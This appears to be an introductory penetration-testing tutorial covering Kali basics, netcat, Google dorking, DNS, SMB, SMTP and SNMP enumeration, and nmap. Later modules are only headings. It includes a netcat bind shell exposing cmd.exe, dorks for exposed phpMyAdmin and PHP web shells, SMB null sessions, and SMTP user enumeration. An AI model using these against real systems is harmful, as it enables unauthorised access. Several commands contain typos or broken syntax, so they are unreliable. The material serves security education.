---
title: Pen Testing
date: 2026-10-11
categories:
  - Tutorials
description: Pen Testing
thumbnail: images/Pen Testing.png
---
## **MODULE 1 - INTRODUCTION**

## WELCOME

**Penetration testing**, also known as **pen testing** or **ethical hacking**, is a simulated cyberattack against a computer system, network, or web application to identify and exploit security vulnerabilities. The goal is to assess the security posture of the system and determine whether unauthorized access or malicious activity is possible.

## FINDING FILES

In Kali Linux (and most Linux distributions), the `locate`, `which`, and `find` commands are used to search for files or determine their locations in different ways. Here’s a breakdown of each:

### **Quick File Search Using a Database**

Syntax:

`locate <filename>` -Quick File Search

**Description**: Searches for files by name using a pre-built index.  
**Pros**: **Fast because it u**ses a database (`/var/lib/mlocate/mlocate.db`) rather than searching the entire filesystem.

**Cons**: Might be outdated unless you update the index by below command:

`sudo updatedb -` update the index

### **Find Location of Executable Programs**

Systax:

`which python3` - Find Location of python3

output : `/usr/bin/python3`

**Description**: Tells you the full path of shell commands (executables).

**Use case**: Helpful for checking which version of a command will run.

### **Advanced File Search Tool**

****`find /etc -name passwd` - **searches the `/etc` directory and all its subdirectories** for a file **named exactly `passwd`**.

**Output:**

find /etc -name passwd

find /etc -name passwd

Syntax:-

`find /home/user -type f -size +10M` - Finds files larger than 10MB in user’s home

**Pros**: Powerful and flexible.

**Cons**: Slower than `locate` due to real-time scanning.

## SERVICES IN KALI

Kali Linux includes a variety of **services** that are either pre-installed or can be enabled for different penetration testing tasks.

### SSH SERVICE

`sudo service ssh start` - Start SSH Service

`netstat -antp | grep sshd` - Verify the SSH listening state

`ssh service stop` - Stop the SSH Service

### HTTP SERVICE

`service apache2 start` - start apache service

**To verify apache status by open by below address in browser :**

[http://127](http://127)..0.0.0/

`/var/www/` - Apache Document Root Directory

**create a sample index page in apache root directory to test the web service is running fine.**

`echo “This is exmple of index page in Apache server running on Kali Linux” > /var/www/index.html`

`service apache2 stop` - stop apache service

### SERVICE MANAGEMENT

`/etc/init.d/ssh start` - start ssh service using SysV-style init scripts

`/etc/init.d/ssh stop` - stop ssh service using SysV-style init scripts

`/etc/init.d/apache2 restart` - restart apache service using SysV-style init scripts

### BOOT PERSISTENCE

`update-rc.d ssh enable` - **enable the SSH service to start automatically at boot time**, when using **SysV-style init scripts**.

`update-rc.d apache2 enable` - **enable the apache2 service to start automatically at boot time**, when using **SysV-style init scripts**.

**Manage Kali servive with `rccconf` and `sysv-rc-conf`:**

`sudo rccconf` - launches a **simple text UI to manage the services**

`sudo sysv-rc-conf` -detailed curses-based UI to manage the services

### BASH SHELL

**SCENARIO 1**

`wget [www.cisco.com](<http://www.cisco.com>)` - download index.html page to local system by wget

`more index.html` -**view index.html files one page at a time**

`cat index.html | “grep href=”` - highlight the “href=” in index.html file

**Reads `index.html`, finds lines with `href=`, extracts the domain part of URLs, and displays the output one screen at a time:-**

`cat index.html | grep "href=" | cut -d "/" -f3 | grep "cisco\.com" | cut -d'"' -f1 | | sort -u | more`

**This command is a shell pipeline that uses `grep`, `sort`, and some regular expressions to extract and process certain patterns from a file named `index.html`.**  
`grep -o '[A-Za-z0-9_\.-]*\.*[cisco.com](<http://cisco.com/>)' index.html | sort -u`

**To extract all unique domain-like strings ending with `cisco.com` from the `index.html` file and save them into `cisco.txt`.**  
`grep -o '[A-Za-z0-9_\.-]*\.*[cisco.com](<http://cisco.com/>)' index.html | sort -u >cisco.txt`

`cat cisco.txt`

Make a script file named : **`nano cisco.sh`**and write the below code then save it.

`#!/bin/bash`

`for url in $(cat cisco.txt); do`

`host $url | grep "has address" | cut -d" " -f4`

`done`

Give the executable permission to this file.

`chmod 755 cisco.sh`

run the script

`./cisco.sh`

Output will look like this :

![image.png](attachment:33604d2f-0360-4abb-8f8c-f053b33df5ba:image.png)

**The one-liner command in the image is a compact Bash loop that extracts Cisco-related domains from `index.html`, resolves them to IP addresses, and prints the results.**

`for url in $(grep -o '[A-Za-z0-9_\.-]*\.*[cisco.com](<http://cisco.com/>)' index.html | sort -u); do host $url | grep "has address" | cut -d" " -f4 done`

## SCENARIO 2

`ifconfig eth0` -

`ping 192.168.0.1` -

create a script file named : nano [ping-loop.sh](http://ping-loop.sh)

`#!/bin/bash for ip in $(seq 200 210); do echo 192.168.31.$ip done`

give the executable permission:

`chmod 755 ping-loop.sh`

run the script:

`./ping-loop.sh`

**Output:**

![image.png](attachment:658d7436-9fbe-4fb6-954b-c635dd9a2b0b:image.png)

---

# **MODULE 2 - ESSENTIAL TOOLS**

## NETCAT -

Netcat (often shortened to `nc`) is a versatile command-line utility used for reading and writing data across network connections, supporting both TCP and UDP protocols. It's commonly used for network debugging, troubleshooting, and various network-related tasks, including port scanning, file transfers, and even creating basic chat servers. Think of it as a powerful, versatile tool for interacting with network services and protocols.

## BANNER GRABBING

Banner grabbing is a technique used to gather information about software, services, and versions running on network hosts. This information can be used for both legitimate security purposes and malicious activities.

`nc -nv <ip-address> <port-number>`

## NETCAT CHAT

copy the `nc.exe` in windows machine on below location:

`c:/windows/`

open cmd and type below commmand to start listening-

`nc -nlvp 4444`

now in kali linux machine type below command with windows machine’s ip address to connect the chat sessoin:

`nc -nv <ip-address>` 4444

now start sending message.

## EXECUTING COMMANDS

## BIND SHELL

A bind shell is **a type of shell where the victim's machine actively opens a port on its network interface**. Once this port is open, the attacker can connect to it, gaining remote terminal access to the victim's machine.

**Run below On windows machine to start listening at port 4444 :**

`nc -lvp 4444 -e cmd.exe`

**On linux machine to connect blind shell:**

`ncat -v 192.168.30.35 4444 -- ssl`

### REVERSE SHELL

**A reverse shell is a shell that is running on one computer but accepts requests and relays the responses to another computer.**

`nc -lvp 4444`

## NCAT

Ncat is **a feature-packed networking utility which reads and writes data across networks from the command line**. Ncat was written for the Nmap Project as a much-improved reimplementation of the venerable Netcat.

copy the `ncat.exe` in windows machine on below location:

`c:/windows/`

open cmd on target windows machine and type below commmand to start listening on 4444-

`nc -lvp 4444 -e cmd,exe --allow <ip-address> --ssl`

executive the below command in attacher linux machine to connect the bliend shall:

`ncat -v <ip-address> 4444 --ssl`

## WIRESHARK

Wireshark is a powerful and widely used network protocol analyzer that allows users to capture and examine data packets traveling through a network in real time. It provides deep visibility into network traffic, enabling detailed inspection of hundreds of supported protocols such as TCP, UDP, HTTP, and DNS. With its robust filtering capabilities, users can isolate specific traffic of interest, making it an essential tool for network troubleshooting, performance monitoring, security analysis, and protocol development. Available across multiple platforms including Windows, macOS, and Linux, Wireshark supports both live capture and analysis of previously recorded data. Due to its ability to access sensitive information, it must be used responsibly and only on networks where proper authorization has been granted.

---

# **MODULE 3 - PASSIVE INFORMATION GATHERING**

## GOOGLE SEARCH

Google search hacking, also named Google dorking, is a hacker technique that uses Google Search and other Google applications to find security holes in the configuration and computer code that websites are using.

## GOOGLE HACKING

`site:google.com -site:www.google.com`

`site:google.com filetype:pdf`

`site:google.com filetype:pdf "Digital Awareness”`

`intitle:"vnc viewer for java”`

`inurl:"/control/userimahe.html”`

`inurl:.php? intext:CHARACTER_SETS,COLLATIONS intitle:phpmyadmin`

`intitle:"-N3t" filetype:php undetectable`

## GHDB

A collection of search queries ("Google Dorks") used to find sensitive information and vulnerabilities indexed by Google.

[https://www.exploit-db.com/google-hacking-database](https://www.exploit-db.com/google-hacking-database)

---

# **MODULE 4 - ACTIVE INFORMATION GATHERING**

## DNS ENUMERATION

**DNS enumeration** is the process of collecting information about DNS (Domain Name System) records associated with a domain. It's commonly used in **penetration testing** and **reconnaissance** to discover potential targets within an organization’s network. Here's a quick breakdown:

- **A records** – IP addresses of domain names.
- **MX records** – Mail servers.
- **NS records** – Nameservers.
- **TXT records** – Often used for SPF, DKIM, and verification.
- **CNAME records** – Aliases for domains.
- **Subdomains** – Can reveal internal or staging services.
- **Zone transfers** – Misconfigured DNS servers can leak entire domain structures.

`host -t ns <domain-name>`

`host -t mx <domain-name>`

`host <domain-name>`

### FORWARD DNS LOOKUP

A DNS forward lookup is **the process of translating a human-readable domain name (like [example.com](http://example.com)) into a computer-readable IP address**

We can also create the batch script for DNS Lookup.

### REVERSE DNS LOOKUP

Reverse DNS lookup (rDNS) is **a process in computer networks where you determine the domain name associated with a given IP address**

### ZONE TRANSFERS

A **DNS zone transfer** (AXFR) is a mechanism designed to replicate DNS databases across DNS servers. In normal use, it's meant for secondary DNS servers to stay synchronized with a primary server. However, **if misconfigured**, it can be exploited during **reconnaissance** to **leak a full list of hosts and subdomains** for a target domain.

`host -t ns <dns-server-domain-name> host -l <dns-server-domain-name>`

we can use the script to try to zone transfer

## PORT SCANNING

### CONNECT SCAN

### 🔌 CONNECT SCAN

- **Also Known As:** TCP Connect Scan.
- Uses full TCP handshake (SYN, SYN-ACK, ACK).
- Most accurate but also most **noisy** (easily detectable by firewalls/IDS).
- Used when user does not have raw packet privileges (e.g., on Windows).

### SYN SCAN

### ⚡ SYN SCAN

- **Half-open scan** using only the SYN and SYN-ACK.
- Fast and stealthy, as it doesn’t complete the TCP handshake.
- Most common scan used with `nmap -sS`.

### UDP SCAN

### 🌊 UDP SCAN

- Scans for open **UDP ports** (e.g., DNS on 53, SNMP on 161).
- Slower than TCP scans due to lack of handshake and ICMP error responses.
- Used with `nmap -sU`.

## NETWORK IMPLICATIONS

- Port scanning can trigger **Intrusion Detection Systems (IDS)**.
- Excessive scans may lead to **IP blocking or blacklisting**.
- Could impact network performance (especially UDP scans).
- Legal implications: Always get permission before scanning.

## NMAP

The most widely used network scanning tool.

### 📈 TRAFFIC ACCOUNTABILITY

- Logging of scan results and tracking scan types per host.
- Use `oA` flag to output in multiple formats (XML, grepable, normal).

### TRAFFIC ACCOUNTABILITY

### TRAFFIC ACCOUNTABILITY

- Logging of scan results and tracking scan types per host.
- Use `oA` flag to output in multiple formats (XML, grepable, normal).

### NETWORK SWEEPING

### 🧹 NETWORK SWEEPING

- Detecting live hosts using:
    - **Ping sweeps**: `nmap -sn`
    - **ARP scans**: `nmap -PR` (for local network)

### OS DISCOVERY

### OS DISCOVERY

- Uses TCP/IP fingerprinting to detect target OS.
- Run with `nmap -O` or `-osscan-guess`.

### NSE SCRIPTS

### NSE SCRIPTS

- **Nmap Scripting Engine** extends Nmap with custom scripts.
- Categories:
    - `auth`, `default`, `discovery`, `vuln`, etc.
- Example: `nmap --script smb-os-discovery -p445 <target>`

## SMB ENUMERATION

### SMB NULL SESSIONS

Allows unauthenticated users to access SMB info.

- Use `rpcclient -U "" <IP>` or tools like `enum4linux`.

### ENUM4LINUX

Perl script for SMB/NetBIOS enumeration on Linux.

- Gathers:
    - Users, Groups, Shares, OS info, password policies, etc.
- Usage: `enum4linux <IP>`

### SMB NSE SCRIPTS

Nmap has specific scripts for SMB enumeration:

- `smb-enum-shares`
- `smb-enum-users`
- `smb-os-discovery`
- `smb-vuln-ms17-010`

## SMTP ENUMERATION

### VRFY SCRIPT

SMTP `VRFY` command checks if a username is valid.

- Syntax: `VRFY user@example.com`
- Can be tested using `telnet`, `nmap`, or Python scripts.

### PYTHON PORT

- Python scripts can automate SMTP user enumeration.
- Example:

```
import smtplib
server = smtplib.SMTP('mail.example.com', 25)
server.ehlo()
server.mail('test@example.com')
code, message = server.rcpt('admin@example.com')
if code == 250:
    print("User exists")

```

## SNMP ENUMERATION

### SNMP MIB

- **Management Information Base (MIB)**: database of objects SNMP can manage.
- Helps interpret SNMP data (like sysName, sysDescr).

### SNMPWALK

- Command-line tool to query SNMP devices.
- Example: `snmpwalk -v2c -c public <IP>`
- Can retrieve:
    - System info, routing tables, interfaces, etc.

---

# **MODULE 5 - VULNERABILITY SCANNING**

## MORE NSE SCRIPTS

## OPENVAS

---

# **MODULE 6 - INTRO TO OVERFLOWS**

## VULNERABLE CODE

## STACK OVERFLOW

---

# **MODULE 7 - WINDOWS BUFFER OVERFLOW EXAMPLE**

## FUZZING

## CRASH REPLICATION

## CONTROLLING EIP

## INTRODUCING SHELLCODE

## BAD CHARACTERS

## REDIRECTING EXECUTION

## INTRODUCING MONA

## SHELLCODE PAYLOAD

---

# **MODULE 8 - LINUX BUFFER OVERFLOW EXAMPLE**

## CONTROLLING EIP

## LOCATING SPACE

## FIRST STAGE SHELLCODE

## LOCATING RET

## GENERATING SHELLCODE

---

# **MODULE 9 - USING PUBLIC EXPLOITS**

## FINDING EXPLOITS

## EXPLOIT-DB

## FIXING EXPLOITS #1

## FIXING EXPLOITS #2

## CROSS COMPILING

---

# **MODULE 10 - FILE TRANSFERS**

## TFTP TRANSFERS

## FTP TRANSFERS

## VBSCRIPT TRANSFERS

## POWERSHELL TRANSFERS

---

# **MODULE 11 - PRIVILEGE ESCALATION**

## LINUX ROOT

## WINDOWS SYSTEM

## WINDOWS WEAK SERVICES

## LINUX WEAK SERVICES

---

# **MODULE 12 - CLIENT SIDE ATTACKS**

## REPLACING SHELLCODE

## JAVA APPLETS

---

# **MODULE 13 - WEB APPLICATION ATTACKS**

## LOCAL FILE INCLUSION SQL

## INJECTION _(TRUNCATED IN SOURCE)_

PASSIVE INFORMATION GATHERING

**Passive information gathering** involves collecting data about a target **without directly interacting** with its systems. This method is stealthy and minimizes the risk of detection, making it a preferred starting point for many ethical hackers.

Google Search/Dork:

**Google Dorking**, also known as **Google hacking**, is a technique that uses advanced Google search operators to find specific information that's not easily accessible through a basic search.

|**Operator**|**Description**|
|---|---|
|`site:`|Search within a specific website or domain. _Example: `site:example.com`_|
|`filetype:`|Search for specific file types. _Example: `filetype:pdf`_|
|`intitle:`|Find pages with certain keywords in the title. _Example: `intitle:"index of"`_|
|`inurl:`|Find pages with specific text in the URL. _Example: `inurl:admin`_|
|`intext:`|Search for text within a page’s content. _Example: `intext:"confidential"`_|
|`cache:`|View Google’s cached version of a page.|
|`allintext:`|Like `intext:`, but searches for all specified terms in the page.|
|`allintitle:`|Like `intitle:`, but all terms must appear in the title.|

Google Hacking Database (GHDB):

# Essential Tools

## NETCAT & NCAT

**Netcat** and **Ncat** are both powerful networking utilities used for reading from and writing to network connections via TCP or UDP, but they have some key differences in features, syntax, and use cases.

---

### 🛠️ Netcat (nc)

### 🔹 Overview:

- Often referred to as the _"Swiss Army knife of networking."_
- Very lightweight and widely available.
- Comes in different versions (OpenBSD, GNU, traditional).

### 🔹 Features:

- Connect to or listen on TCP/UDP ports
- File transfer
- Simple chat server
- Port scanning (basic)
- Bind shell/reverse shell

### 🔹 Example Usage:

```bash
# Listen on port 1234
nc -l -p 1234

# Connect to a host
nc 192.168.1.10 1234

```

---

### 🛠️ Ncat

### 🔹 Overview:

- A modern reimplementation of Netcat, developed by the **Nmap** project.
- More secure and feature-rich.
- Cross-platform (Linux and Windows).

### 🔹 Enhanced Features:

- SSL/TLS support
- Connection brokering (proxy via Ncat relay)
- Input/output redirection
- IPv6 support
- Connection logging
- Authentication

### 🔹 Example Usage:

```bash
# Listen with SSL
ncat --ssl -l 1234

# Connect using SSL
ncat --ssl target.com 1234

```

---

### 🔍 Key Differences:

|Feature|Netcat (nc)|Ncat|
|---|---|---|
|SSL/TLS Support|❌ No|✅ Yes|
|Cross-platform|❌ Limited|✅ Yes|
|Maintained|⚠️ Some forks|✅ Actively (by Nmap)|
|Input/output control|⚠️ Basic|✅ Advanced|
|Authentication|❌ No|✅ Yes|
|Relay/proxy mode|❌ No|✅ Yes|

## Wireshark

**Wireshark** is a **free and open-source network protocol analyzer** used for capturing and inspecting data traffic on a computer network in real time. It’s one of the most powerful tools for **network troubleshooting**, **protocol analysis**, **penetration testing**, and **digital forensics**.

---

### 🔍 Key Features of Wireshark:

- **Live packet capture** from network interfaces (Ethernet, Wi-Fi, etc.)
- **Deep inspection** of hundreds of protocols (TCP, UDP, HTTP, DNS, etc.)
- **Color-coded filtering** and highlighting for easy analysis
- **Packet reassembly** for protocols like TCP
- **Exporting data** for offline analysis (e.g., `.pcap` files)
- **Display filters** for fine-grained inspection of traffic
- **Decryption support** for many protocols (e.g., SSL/TLS if keys are available)

---

### 🛠️ Common Use Cases:

|Use Case|Example|
|---|---|
|Network troubleshooting|Identify packet loss or latency issues|
|Security analysis|Detect suspicious packets or attacks|
|Protocol development/testing|Debug and verify custom protocols|
|Malware analysis|Inspect C2 traffic or exfiltration|
|Educational purposes|Learn how protocols like TCP/IP work|

---

### 🔧 Basic Workflow:

1. **Start Capture** on a network interface.
2. **Apply Filters** to narrow down the traffic (e.g., `http`, `ip.addr == 192.168.1.1`).
3. **Inspect Packets**: View headers, payloads, and protocol details.
4. **Save or Export** the capture for future analysis.

---

### 📦 Example Filters:

- `ip.addr == 192.168.1.10` → Show traffic to/from that IP
- `tcp.port == 80` → Show HTTP traffic
- `http.request` → Show HTTP requests only
- `dns` → Show DNS queries/responses

---

### 📌 Note:

- **Wireshark requires root/admin privileges** to capture on some systems.
- It can capture **sensitive information** (e.g., passwords in plain text protocols), so use it responsibly and legally.

Would you like a sample `.pcap` file walkthrough or an example of using Wireshark for packet sniffing?

[](https://app.notion.com/p/25226fbde15080f884cec09bbff88a26?pvs=21)